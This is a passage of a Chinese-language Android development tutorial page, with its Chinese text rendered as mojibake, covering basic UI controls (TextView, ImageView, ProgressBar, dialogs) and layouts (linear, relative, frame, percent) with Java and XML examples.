id="TextView">TextView</h4><p>TextViewæ–‡å­—é»˜è®¤åœ¨å·¦ä¸Šæ–¹</p><p><strong>æŒ‡å®šæ–‡å­—å¯¹é½æ–¹å¼</strong></p><p><img src="/posts/69766bbb.htm/image-20240718181813169.png" alt="image-20240718181813169"></p><p>ä¿®æ”¹é¢œè‰²å¤§å°</p><p><img src="/posts/69766bbb.htm/image-20240718181955059.png" alt="image-20240718181955059"></p><h4 id="Button">Button</h4><p>buttoné»˜è®¤å­—æ¯å¤§å†™ï¼Œå¦‚ä¸‹å‘½ä»¤å¯ä»¥ä¿®æ”¹ <code>android:textAllCaps=&quot;false&quot;</code></p><h4 id="EditText">EditText</h4><p><img src="/posts/69766bbb.htm/image-20240718183150170.png" alt="image-20240718183150170"></p><p><code>android:maxLines=&quot;2&quot;</code>æŒ‡å®šæœ€å¤§è¡Œæ•°ä¸º2è¡Œ</p><p>è·å–ç¼–è¾‘æ¡†çš„å†…å®¹ <code>String input=editText.getText().toString();</code></p><h4 id="ImageView">ImageView</h4><p>æŒ‡å®šç…§ç‰‡  <code>android:src=&quot;@drawable/ic_launcher_background&quot;</code></p><p>ä¿®æ”¹æ˜¾ç¤ºçš„å›¾ç‰‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line">    <span class="keyword">private</span> ImageView imageView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        button = findViewById(R.id.button);</span><br><span class="line">        imageView=findViewById(R.id.image_view);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">                    <span class="keyword">case</span> R.id.button:</span><br><span class="line">                        imageView.setImageResource(R.drawable.img);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†ç‚¹å‡»æŒ‰é’®äº‹ä»¶åï¼Œè°ƒç”¨setImageResource()æ–¹æ³•æ”¹å˜æ˜¾ç¤ºå›¾ç‰‡ä¸ºR.drawable.img</p><h4 id="ProgressBar">ProgressBar</h4><p>ç”¨äºç•Œé¢ä¸Šæ˜¾ç¤ºä¸€ä¸ªè¿›åº¦æ¡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ProgressBar</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/process_bar&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p><strong>Androidæ§ä»¶çš„å¯è§å±æ€§</strong></p><p>é€šè¿‡android:visibilityæŒ‡å®šï¼Œæœ‰ä¸‰ä¸ªé€‰æ‹©ï¼švisibleï¼Œinvisibleï¼Œgone</p><p>visibleï¼šæ§ä»¶å¯è§</p><p>invisibleï¼šæ§ä»¶ä¸å¯è§ï¼Œä½†ä»å æ®åŸæ¥ä½ç½®</p><p>goneï¼šæ§ä»¶ä¸å¯è§ï¼Œä¸”ä¸å ç”¨å±å¹•ç©ºé—´</p><p>è¿˜å¯ä»¥é€šè¿‡ä»£ç æ§åˆ¶å¯è§æ€§</p><p>ä½¿ç”¨setVisibility()ï¼Œä¼ å…¥View.VISIBLEï¼ŒView.INVISIBLEï¼ŒView.GONE</p><p>å®ç°ç‚¹å‡»æŒ‰é’®è®©è¿›åº¦æ¡æ¶ˆå¤±å‡ºç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       setContentView(R.layout.activity_main);</span><br><span class="line">       button = findViewById(R.id.button);</span><br><span class="line">       progressBar=findViewById(R.id.progress_bar);</span><br><span class="line">       button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">               <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">                   <span class="keyword">case</span> R.id.button:</span><br><span class="line">                       <span class="keyword">if</span>(progressBar.getVisibility()==View.GONE)&#123;</span><br><span class="line">                           progressBar.setVisibility(View.VISIBLE);</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           progressBar.setVisibility((View.GONE));</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   <span class="keyword">default</span>:</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ProgressBaræ§ä»¶é€šè¿‡styleå±æ€§å¯ä»¥å°†ä»–æŒ‡å®šä¸ºæ°´å¹³è¿›åº¦æ¡</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">style=<span class="string">&quot;?android:attr/progressBarStyleHorizontal&quot;</span></span><br><span class="line">android:<span class="built_in">max</span>=<span class="string">&quot;100&quot;</span>  <span class="comment">//è¿›åº¦æ¡æœ€å¤§å€¼</span></span><br></pre></td></tr></table></figure><p>åŠ¨æ€æ›´æ”¹è¿›åº¦æ¡è¿›åº¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">          <span class="keyword">case</span> R.id.button:</span><br><span class="line">               <span class="type">int</span> <span class="variable">progress</span> <span class="operator">=</span> progressBar.getProgress();</span><br><span class="line">               progress=progress+<span class="number">10</span>;</span><br><span class="line">               progressBar.setProgress(progress);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="AlterDialog">AlterDialog</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">     <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">          <span class="keyword">case</span> R.id.button:</span><br><span class="line">              AlertDialog.Builder dialog= <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">              dialog.setTitle(<span class="string">&quot;This is dialog&quot;</span>);</span><br><span class="line">              dialog.setMessage(<span class="string">&quot;Something Important&quot;</span>);</span><br><span class="line">              dialog.setCancelable(<span class="literal">false</span>); <span class="comment">//ç‚¹å‡»å¯¹è¯æ¡†å¤– ä¸èƒ½å–æ¶ˆå¯¹è¯æ¡†</span></span><br><span class="line">              dialog.setPositiveButton(<span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              dialog.setNegativeButton(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener()</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              dialog.show();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ProgressDialog">ProgressDialog</h4><p>ä¼šåœ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºä¸€ä¸ªè¿›åº¦æ¡ï¼Œä¸€èˆ¬ç”¨äºè¡¨ç¤ºå½“å‰æ“ä½œæ¯”è¾ƒè€—æ—¶ï¼Œè®©ç”¨æˆ·è€å¿ƒç­‰å¾…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View view) &#123;</span><br><span class="line">     switch (view.getId())&#123;</span><br><span class="line">         case R.id.button:</span><br><span class="line">              ProgressDialog progressDialog=new ProgressDialog(MainActivity.this);</span><br><span class="line">              progressDialog.setTitle(&quot;This is dialog&quot;);</span><br><span class="line">              progressDialog.setMessage(&quot;Something Important&quot;);</span><br><span class="line">              progressDialog.setCancelable(false);</span><br><span class="line">              progressDialog.show();         </span><br><span class="line">              break;</span><br><span class="line">        default:</span><br><span class="line">              break;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒprogressDialog.setCancelable(false)ä¼ å…¥falseï¼Œè¡¨ç¤ºä¸èƒ½é€šè¿‡Backé”®å–æ¶ˆæ‰ï¼Œå¿…é¡»é€šè¿‡è°ƒç”¨dismiss()æ¥å…³é—­å¯¹è¯æ¡†ã€‚</p><h3 id="4ç§åŸºæœ¬å¸ƒå±€">4ç§åŸºæœ¬å¸ƒå±€</h3><h4 id="LinearLayout">LinearLayout</h4><p>æ§ä»¶å‚ç›´çº¿æ€§æ’åˆ—</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;vertical&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>æ§ä»¶æ°´å¹³çº¿æ€§æ’åˆ—</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;horizontal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æŒ‡å®šandroid:orientationï¼Œé»˜è®¤æ’åˆ—æ–¹å‘æ°´å¹³</p><p><strong>android:layout_gravity</strong>ï¼šç”¨äºæŒ‡å®šæ§ä»¶åœ¨å¸ƒå±€ä¸­å¯¹é½æ–¹å¼ï¼Œéœ€æ³¨æ„å½“çº¿æ€§å¸ƒå±€æ’åˆ—æ–¹å‘æ˜¯æ°´å¹³æ—¶ï¼Œåªæœ‰å‚ç›´æ–¹å‘çš„å¯¹é½æ–¹å¼æ‰ä¼šç”Ÿæ•ˆï¼ŒåŒç†å½“çº¿æ€§å¸ƒå±€æ’åˆ—æ–¹å‘æ˜¯å‚ç›´æ—¶ï¼Œåªæœ‰æ°´å¹³æ–¹å‘çš„å¯¹é½æ–¹å¼æ‰ä¼šç”Ÿæ•ˆ</p><p><strong>android:layout_gravity</strong>ä½¿ç”¨å¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;horizontal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;top&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;bottom&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p><strong>android:layout_weight</strong>ï¼šè®¾ç½®æ§ä»¶æ¯”ä¾‹å¤§å°</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;EditText</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/input_message&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span></span><br><span class="line">        android:<span class="attribute">hint</span>=<span class="string">&quot;input&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†weightå±æ€§ï¼Œæ­¤æ—¶æ§ä»¶å®½åº¦ä¸å†ç”±layout_widthå†³å®šï¼Œä¸”<code>android:layout_width=&quot;0dp&quot;</code>æ˜¯æ¯”è¾ƒè§„èŒƒå†™æ³•ï¼Œè¿™é‡Œdpè¡¨ç¤ºæ§ä»¶å¤§å°æˆ–è€…é—´è·</p><h4 id="ç›¸å¯¹å¸ƒå±€RelativeLayout">ç›¸å¯¹å¸ƒå±€RelativeLayout</h4><p>æ§ä»¶ç›¸å¯¹äºå¸ƒå±€è¿›è¡Œå®šä½</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_alignParentL<span class="attr">eft</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>  <span class="comment">//ä½äºå¸ƒå±€å·¦è¾¹</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentR<span class="attr">ight</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="comment">//ä½äºå¸ƒå±€å³è¾¹</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentT<span class="attr">op</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>   <span class="comment">//ä½äºå¸ƒå±€é¡¶è¾¹</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignParentB<span class="attr">ottom</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="comment">//ä½äºå¸ƒå±€åº•è¾¹</span></span><br><span class="line"><span class="symbol">android:</span>layout_centerInP<span class="attr">arent</span><span class="operator">=</span><span class="string">&quot;true&quot;</span>   <span class="comment">//ä½äºå¸ƒå±€ä¸­é—´</span></span><br></pre></td></tr></table></figure><p>æ§ä»¶ç›¸å¯¹äºå…¶ä»–æ§ä»¶è¿›è¡Œå®šä½</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_<span class="attr">above</span><span class="operator">=</span><span class="string">&quot;@id/idâ€”_name&quot;</span>   <span class="comment">//ä½äºç›¸æ¯”æ§ä»¶ä¸Šé¢</span></span><br><span class="line"><span class="symbol">android:</span>layout_<span class="attr">below</span><span class="operator">=</span><span class="string">&quot;@id/idâ€”_name&quot;</span>   <span class="comment">//ä½äºç›¸æ¯”æ§ä»¶ä¸‹é¢</span></span><br><span class="line"><span class="symbol">android:</span>layout_toLeftOf=<span class="string">&quot;@id/idâ€”_name&quot;</span>  <span class="comment">//ä½äºç›¸æ¯”æ§ä»¶å·¦é¢</span></span><br><span class="line"><span class="symbol">android:</span>layout_toRightOf=<span class="string">&quot;@id/idâ€”_name&quot;</span> <span class="comment">//ä½äºç›¸æ¯”æ§ä»¶å³é¢</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ç»„</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>layout_alignL<span class="attr">eft</span><span class="operator">=</span><span class="string">&quot;@id/idâ€”_name&quot;</span>   <span class="comment">//ä¸€ä¸ªç»„ä»¶å·¦è¾¹ç¼˜å’Œå¦ä¸€ä¸ªç»„ä»¶å·¦è¾¹ç¼˜å¯¹é½</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignR<span class="attr">ight</span><span class="operator">=</span><span class="string">&quot;@id/idâ€”_name&quot;</span>  <span class="comment">//ä¸€ä¸ªç»„ä»¶å³è¾¹ç¼˜å’Œå¦ä¸€ä¸ªç»„ä»¶å³è¾¹ç¼˜å¯¹é½</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignT<span class="attr">op</span><span class="operator">=</span><span class="string">&quot;@id/idâ€”_name&quot;</span>   <span class="comment">//ä¸€ä¸ªç»„ä»¶ä¸Šè¾¹ç¼˜å’Œå¦ä¸€ä¸ªç»„ä»¶ä¸Šè¾¹ç¼˜å¯¹é½</span></span><br><span class="line"><span class="symbol">android:</span>layout_alignB<span class="attr">ottom</span><span class="operator">=</span><span class="string">&quot;@id/idâ€”_name&quot;</span>  <span class="comment">//ä¸€ä¸ªç»„ä»¶ä¸‹è¾¹ç¼˜å’Œå¦ä¸€ä¸ªç»„ä»¶ä¸‹è¾¹ç¼˜å¯¹é½</span></span><br></pre></td></tr></table></figure><h4 id="å¸§å¸ƒå±€">å¸§å¸ƒå±€</h4><p>è¿™ç§å¸ƒå±€æ²¡æœ‰æ–¹ä¾¿çš„å®šä½æ–¹å¼ï¼Œç»„ä»¶é»˜è®¤æ‘†æ”¾åœ¨å¸ƒå±€å·¦ä¸Šè§’</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>android:layout_gravity</code>å±æ€§</p><h4 id="ç™¾åˆ†æ¯”å¸ƒå±€">ç™¾åˆ†æ¯”å¸ƒå±€</h4><p>åªæœ‰çº¿æ€§å¸ƒå±€æ”¯æŒlayout_weightå±æ€§ï¼Œç›¸å¯¹å¸ƒå±€å’Œå¸§å¸ƒå±€ä¸æ”¯æŒã€‚ä¸ºäº†ä½¿è¿™ä¸¤ä¸ªä¹Ÿå¯ä»¥æ¯”ä¾‹åˆ†å‰²å¸ƒå±€å¼•ç”¨ç™¾åˆ†æ¯”å¸ƒå±€ã€‚åœ¨è¿™ç§å¸ƒå±€ä¸åœ¨ä½¿ç”¨wrap_content,match_parentç­‰æ–¹å¼æŒ‡å®šæ§ä»¶å¤§å°ï¼Œè€Œæ˜¯ç›´æ¥æŒ‡å®šæ§ä»¶åœ¨å¸ƒå±€ä¸­æ‰€å çš„ç™¾åˆ†æ¯”ã€‚</p><p>ç™¾åˆ†æ¯”å¸ƒå±€åªä¸ºå¸§å¸ƒå±€ï¼Œç›¸å¯¹å¸ƒå±€è¿›è¡ŒåŠŸèƒ½æ‹“å±•â€“&gt;PercentFrameLayoutå’ŒPercentRelativeLayout</p><p><strong>ç™¾åˆ†æ¯”å¸ƒå±€çš„ä½¿ç”¨</strong></p><p>åœ¨app/build.gradleæ·»åŠ ä¾èµ– <code>compile 'com.android.support:percent:24.2.1'</code></p><p>æœ€å¤–å±‚ä½¿ç”¨PercentFrameLayoutï¼Œç”¨å®Œæ•´åŒ…è·¯å¾„æ¥è¡¨ç¤ºï¼Œå¿…é¡»è¿˜å®šä¹‰ä¸€ä¸ªappå‘½åç©ºé—´ã€‚</p><p>app:layout_heightPercent app:layout_widthPercentå±æ€§ï¼ŒæŒ‡å®šç™¾åˆ†æ¯”</p><h3 id="è‡ªå®šä¹‰æ§ä»¶">è‡ªå®šä¹‰æ§ä»¶</h3><p>å¸¸ç”¨æ§ä»¶å’Œå¸ƒå±€çš„ç»§æ‰¿ç»“æ„</p><p><img src="/posts/69766bbb.htm/image-20240719141008153.png" alt="image-20240719141008153"></p><h4 id="å¼•ç”¨å¸ƒå±€">å¼•ç”¨å¸ƒå±€</h4><p><code>android:background</code>ï¼šä¸ºå¸ƒå±€æˆ–è€…æ§ä»¶æŒ‡å®šä¸€ä¸ªèƒŒæ™¯</p><p><code>android_layout_margin</code>ï¼šæŒ‡å®šæ§ä»¶ä¸Šä¸‹å·¦å³æ–¹å‘ä¸Šåç§»çš„è·ç¦»ã€‚ä¹Ÿå¯ä½¿ç”¨android_layout_marginTopç­‰</p><p>åœ¨ç¼–å†™å®Œæ ‡é¢˜å¸ƒå±€ï¼Œå¦‚ä¸‹å›¾</p><p><img src="/posts/69766bbb.htm/image-20240719152219494.png" 